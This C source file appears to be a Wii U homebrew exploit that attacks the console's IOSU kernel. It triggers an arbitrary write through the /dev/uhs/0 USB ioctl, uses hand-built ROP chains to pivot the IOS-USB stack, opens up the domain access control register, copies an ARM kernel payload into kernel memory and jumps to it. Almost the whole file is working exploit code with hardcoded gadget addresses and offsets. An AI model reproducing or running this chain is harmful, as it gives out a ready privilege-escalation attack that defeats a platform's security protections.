 #include "iosu_kernel.h"
#include "../utils/logger.h"
#include <whb/file.h>
#include <coreinit/thread.h>
#include <coreinit/IOS.h>
#include <coreinit/Cache.h>
#include <coreinit/MemoryMap.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>
#include <string>
//#ifdef __cplusplus
//extern "C"{
//#endif

extern "C" void kern_write(void *addr, uint32_t value); 
extern "C" void SC_KernelCopyData(void* dst, void* src, size_t size);

int USB_Write32(int fd, uint32_t *someOtherPointer, uint32_t addr, uint32_t value) {

    uint32_t input[2] = {0xFFF415D4, value};
    uint32_t output[32];

    someOtherPointer[0x208] = addr - 0x18;
    DCFlushRange(someOtherPointer, 0x1000);
    OSSleepTicks(0x200000);

    return IOS_Ioctl(fd, 0x15, input, sizeof(input), output, sizeof(output));

}

extern "C" void* __OSPhysicalToEffectiveCached(uint32_t);

int IOSU_Kernel_Exploit() {
    bool are_we_on_555 = false;
    const char* coreinit_build = (const char*)0x100011A0; // coreinit static .rodata
    if(!strcmp(coreinit_build, "Feb  4 2021")) {
        are_we_on_555 = true;
    }
    auto Result = 0;
    /* Stack Pivot ROP Chain starts at 0x1016AD78 */
    uint32_t *firstRopChain = (uint32_t*)0xF4120000;
    memset(firstRopChain, 0, 0x1C8);

    /* memcpy(0x1015BD00, 0x00130000, 0x00004000); */
    firstRopChain[0x000/4] = POP_R0_R1_R4_PC;
    firstRopChain[0x004/4] = 0x1015BD00;
    firstRopChain[0x008/4] = 0;
    firstRopChain[0x00C/4] = 0;
    firstRopChain[0x010/4] = POP_R1_R2_R5_PC;
    firstRopChain[0x014/4] = 0x00130000;
    firstRopChain[0x018/4] = 0x00004000;
    firstRopChain[0x01C/4] = 0;
    firstRopChain[0x020/4] = USB_Memcpy;
    firstRopChain[0x024/4] = 0;
    firstRopChain[0x028/4] = 0;

    firstRopChain[0x02C/4] = POP_R0_R1_R4_PC;
    firstRopChain[0x030/4] = POP_R1_R2_R5_PC;
    firstRopChain[0x034/4] = 0;
    firstRopChain[0x038/4] = 0;

    firstRopChain[0x03C/4] = MOV_R0_TO_LR__ADD_SP_8__POP_PC;
    firstRopChain[0x040/4] = 0;
    firstRopChain[0x044/4] = 0;

    /* IOSU_CreateThread(0x10101634, 0, 0x101001DC, 0x68, 1, 2); */
    firstRopChain[0x048/4] = POP_R0_R1_R4_PC;
    firstRopChain[0x04C/4] = POP_R4_R5_PC; // thread_func
    firstRopChain[0x050/4] = 0;
    firstRopChain[0x054/4] = 0;

    firstRopChain[0x058/4] = POP_R1_TO_R7_PC;
    firstRopChain[0x05C/4] = 0; // thread_args
    firstRopChain[0x060/4] = 0x101001DC; // thread_stack, we need to patch some code using the CreateThread exploit
    firstRopChain[0x064/4] = 0x68;
    firstRopChain[0x068/4] = 0;
    firstRopChain[0x06C/4] = 0;
    firstRopChain[0x070/4] = 0;
    firstRopChain[0x074/4] = 0;

    firstRopChain[0x078/4] = USB_IOS_CreateThread;
    firstRopChain[0x07C/4] = 1; // Thread Priority 	(the syscall actually reads it from the stack)
    firstRopChain[0x080/4] = 2; // Thread Flags 	(the syscall actually reads it from the stack too)
    firstRopChain[0x084/4] = 0;

    firstRopChain[0x088/4] = POP_R1_R2_R5_PC;
    firstRopChain[0x08C/4] = 0;
    firstRopChain[0x090/4] = CALC_STACK_OFFSET(0x1015BD00, 0x1016AD78, 0xC0);
    firstRopChain[0x094/4] = 0;

    firstRopChain[0x098/4] = POP_R4_TO_R11_PC;
    firstRopChain[0x09C/4] = 0;
    firstRopChain[0x0A0/4] = 0;
    firstRopChain[0x0A4/4] = 0;
    firstRopChain[0x0A8/4] = 0;
    firstRopChain[0x0AC/4] = 0;
    firstRopChain[0x0B0/4] = 0;
    firstRopChain[0x0B4/4] = 0;
    firstRopChain[0x0B8/4] = 4;

    firstRopChain[0x0BC/4] = 0x1012EA68; // at this point, sp = 0x1016AD78 + 0xC0
    DCFlushRange(firstRopChain, 0x1C8);


    uint32_t *iosUsbRopChain = (uint32_t*)0xF4130000;
    memset(iosUsbRopChain, 0, 0x4000);

    /* IOS_CreateMessageQueue(0x08120000 - 8, 0x40000002) */
    iosUsbRopChain[0x000/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x004/4] = POP_R1_R2_R5_PC;
    iosUsbRopChain[0x008/4] = 0;
    iosUsbRopChain[0x00C/4] = 0;

    iosUsbRopChain[0x010/4] = MOV_R0_TO_LR__ADD_SP_8__POP_PC;
    iosUsbRopChain[0x014/4] = 0;
    iosUsbRopChain[0x018/4] = 0;

    iosUsbRopChain[0x01C/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x020/4] = 0x08120000 - 8;
    iosUsbRopChain[0x024/4] = 0x40000002;
    iosUsbRopChain[0x028/4] = 0;

    iosUsbRopChain[0x02C/4] = USB_IOS_CreateMessageQueue;

    iosUsbRopChain[0x030/4] = 0;
    iosUsbRopChain[0x034/4] = 0;
    iosUsbRopChain[0x038/4] = 0x01FFF000 - 0x1C - 4;

    /* save our queue ID to memory */
    iosUsbRopChain[0x03C/4] = STR_R0_R5_0x1C__POP_R4_R5_PC; // *(int*)(0x01FFF000 - 4) = IOS_CreateMessageQueue(...)
    iosUsbRopChain[0x040/4] = 0;
    iosUsbRopChain[0x044/4] = 0;

    /* IOS_SendMessageToQueue(*(int*)(0x01FFF000 - 4), 0xDEADC0DE, 1) */
    iosUsbRopChain[0x048/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x04C/4] = 0x01FFF000 - 4;
    iosUsbRopChain[0x050/4] = 0;
    iosUsbRopChain[0x054/4] = 0;
    iosUsbRopChain[0x058/4] = LDR_R0_R0__BX_LR;
    // POP_R1_R2_R5_PC from LR
    iosUsbRopChain[0x05C/4] = 0xDEADC0DE;
    iosUsbRopChain[0x060/4] = 1; // flags != 0 -> skip a bunch of weird stuff
    iosUsbRopChain[0x064/4] = 0;
    iosUsbRopChain[0x068/4] = USB_IOS_SendMessage;
    iosUsbRopChain[0x06C/4] = 0;
    iosUsbRopChain[0x070/4] = 0;
    iosUsbRopChain[0x074/4] = 0;


    /* IOS_SendMessageToQueue(*(int*)(0x01FFF000 - 4), 0xDEADC0DE, 1) */
    iosUsbRopChain[0x078/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x07C/4] = 0x01FFF000 - 4;
    iosUsbRopChain[0x080/4] = 0;
    iosUsbRopChain[0x084/4] = 0;
    iosUsbRopChain[0x088/4] = LDR_R0_R0__BX_LR;
    // POP_R1_R2_R5_PC from LR
    iosUsbRopChain[0x08C/4] = 0xDEADC0DE;
    iosUsbRopChain[0x090/4] = 1; // flags != 0 -> skip a bunch of weird stuff
    iosUsbRopChain[0x094/4] = 0;
    iosUsbRopChain[0x098/4] = USB_IOS_SendMessage;
    iosUsbRopChain[0x09C/4] = 0;
    iosUsbRopChain[0x0A0/4] = 0;
    iosUsbRopChain[0x0A4/4] = 0;

    /* IOS_SendMessageToQueue(*(int*)(0x01FFF000 - 4), 0xE12FFF13, 1) */
    iosUsbRopChain[0x0A8/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x0AC/4] = 0x01FFF000 - 4;
    iosUsbRopChain[0x0B0/4] = 0;
    iosUsbRopChain[0x0B4/4] = 0;
    iosUsbRopChain[0x0B8/4] = LDR_R0_R0__BX_LR;
    // POP_R1_R2_R5_PC from LR
    iosUsbRopChain[0x0BC/4] = 0xE12FFF13; // BX R3
    iosUsbRopChain[0x0C0/4] = 1; // flags != 0 -> skip a bunch of weird stuff
    iosUsbRopChain[0x0C4/4] = 0;
    iosUsbRopChain[0x0C8/4] = USB_IOS_SendMessage;
    iosUsbRopChain[0x0CC/4] = 0;
    iosUsbRopChain[0x0D0/4] = 0;
    iosUsbRopChain[0x0D4/4] = 0;

    /* set all bits in domain access control register (mcr p15, 0, r0, c3, c0, 0) */
    iosUsbRopChain[0x0D8/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x0DC/4] = 0xFFFFFFFF;
    iosUsbRopChain[0x0E0/4] = 0;
    iosUsbRopChain[0x0E4/4] = 0;
    iosUsbRopChain[0x0E8/4] = POP_R1_TO_R7_PC;
    iosUsbRopChain[0x0EC/4] = 0;
    iosUsbRopChain[0x0F0/4] = 0;
    iosUsbRopChain[0x0F4/4] = IOS_SetAccessDomainCtrlReg;
    iosUsbRopChain[0x0F8/4] = 0;
    iosUsbRopChain[0x0FC/4] = 0;
    iosUsbRopChain[0x100/4] = 0;
    iosUsbRopChain[0x104/4] = 0;
    iosUsbRopChain[0x108/4] = USB_IOS_Syscall_0x4F;
    iosUsbRopChain[0x10C/4] = 0;
    iosUsbRopChain[0x110/4] = 0;
    iosUsbRopChain[0x114/4] = 0;

    /* kernel_memcpy(0x08135000, 0x01D00000, 0xBF00); */
    iosUsbRopChain[0x118/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x11C/4] = 0x08135000;
    iosUsbRopChain[0x120/4] = 0;
    iosUsbRopChain[0x124/4] = 0;
    iosUsbRopChain[0x128/4] = POP_R1_TO_R7_PC;
    iosUsbRopChain[0x12C/4] = 0x01D00000;
    iosUsbRopChain[0x130/4] = arm_kernel_bin_len;
    iosUsbRopChain[0x134/4] = IOS_KernelMemcpy;
    iosUsbRopChain[0x138/4] = 0;
    iosUsbRopChain[0x13C/4] = 0;
    iosUsbRopChain[0x140/4] = 0;
    iosUsbRopChain[0x144/4] = 0;
    iosUsbRopChain[0x148/4] = USB_IOS_Syscall_0x4F;
    iosUsbRopChain[0x14C/4] = 0;
    iosUsbRopChain[0x150/4] = 0;
    iosUsbRopChain[0x154/4] = 0;

    /* IOS_DCFlushRange(0x08135000, 0x4001); */ /* flush and clear the entire data cache */
    iosUsbRopChain[0x158/4] = POP_R0_R1_R4_PC;
    iosUsbRopChain[0x15C/4] = 0x08135000;
    iosUsbRopChain[0x160/4] = 0x4001;
    iosUsbRopChain[0x164/4] = 0;
    iosUsbRopChain[0x168/4] = USB_IOS_DCFlushRange;
    iosUsbRopChain[0x16C/4] = 0;
    iosUsbRopChain[0x170/4] = 0;
    iosUsbRopChain[0x174/4] = 0;

    /* jump to our code */
    iosUsbRopChain[0x178/4] = POP_R1_TO_R7_PC;
    iosUsbRopChain[0x17C/4] = 0;
    iosUsbRopChain[0x180/4] = 0;
    iosUsbRopChain[0x184/4] = 0x08135000;
    iosUsbRopChain[0x188/4] = 0;
    iosUsbRopChain[0x18C/4] = 0;
    iosUsbRopChain[0x190/4] = 0;
    iosUsbRopChain[0x194/4] = 0;
    iosUsbRopChain[0x198/4] = USB_IOS_Syscall_0x4F;
    iosUsbRopChain[0x19C/4] = 0;
    iosUsbRopChain[0x1A0/4] = 0;
    iosUsbRopChain[0x1A4/4] = 0;

    iosUsbRopChain[0x1A8/4] = USB_EndTextSection; // reply + back to the IOS-USB main loop code

    DCFlushRange(iosUsbRopChain, 0x4000);

    int32_t fd = (int32_t)IOS_Open("/dev/uhs/0", IOS_OPEN_READ);

    uint32_t *fakeInternalRootHub = (uint32_t*)__OSPhysicalToEffectiveCached(0x10146080 + 0xFFF415D4 * 0x144 + 0x39ec);
    uint32_t *someOtherPointer = (uint32_t*)0xF4500000;
    memset(fakeInternalRootHub, 0, 0x144);
    memset(someOtherPointer, 0, 0xC00);

    /* hardcoded values to pass checks */
    fakeInternalRootHub[0x4e] = 0;
    fakeInternalRootHub[0x21] = (uint32_t)OSEffectiveToPhysical((uint32_t)someOtherPointer);
    someOtherPointer[0x08] = (uint32_t)OSEffectiveToPhysical((uint32_t)someOtherPointer);
    someOtherPointer[0x05] = 1;

    DCFlushRange(fakeInternalRootHub, 0x144);

    memcpy((void*)0xF5D00000, arm_kernel_bin, arm_kernel_bin_len);
    DCFlushRange((void*)0xF5D00000, arm_kernel_bin_len);

    *(uint32_t*)0xF4147FFC = are_we_on_555;

    memcpy((void*)0xF4148004, arm_user_bin, arm_user_bin_len);
    *(uint32_t*)0xF4148000 = arm_user_bin_len;
    DCFlushRange((void*)0xF4147FFC, arm_user_bin_len + 8);

    /* memcpy(0x1016AD78, pa_OurRopChain, 0x1C8) */
    USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x14, 0x1016AD40 + 0x14 + 0x4 + 0x20);
    USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x10, 0x1011814C);
    USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x0C, (uint32_t)OSEffectiveToPhysical((uint32_t)firstRopChain));
    int rc = USB_Write32(fd, someOtherPointer, 0x1016AD40 + 0x00, 0x1012392b);

  /*  if(rc == 1337 && confirm) {
        *confirm = 1;
        Result = 1;
        
    } */
    DEBUG_FUNCTION_LINE("IOSU Exploit worked\n");
    IOS_Close(fd);
return Result;
}
//#ifdef __cplusplus
//}
//#endif